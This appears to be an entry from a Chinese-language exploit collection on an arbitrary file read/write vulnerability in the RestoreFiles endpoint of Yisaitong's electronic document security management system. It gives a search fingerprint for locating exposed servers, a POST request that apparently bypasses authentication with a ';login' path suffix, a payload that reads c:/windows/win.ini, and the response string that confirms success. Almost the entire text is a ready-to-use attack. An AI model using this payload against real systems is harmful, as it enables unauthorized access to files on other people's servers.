# 亿赛通电子文档安全管理系统RestoreFiles任意文件读取漏洞

亿赛通电子文档安全管理系统RestoreFiles ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/document/RestoreFiles;login HTTP/1.1`

**Payload**
```
command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini
```
- **响应特征**：200 support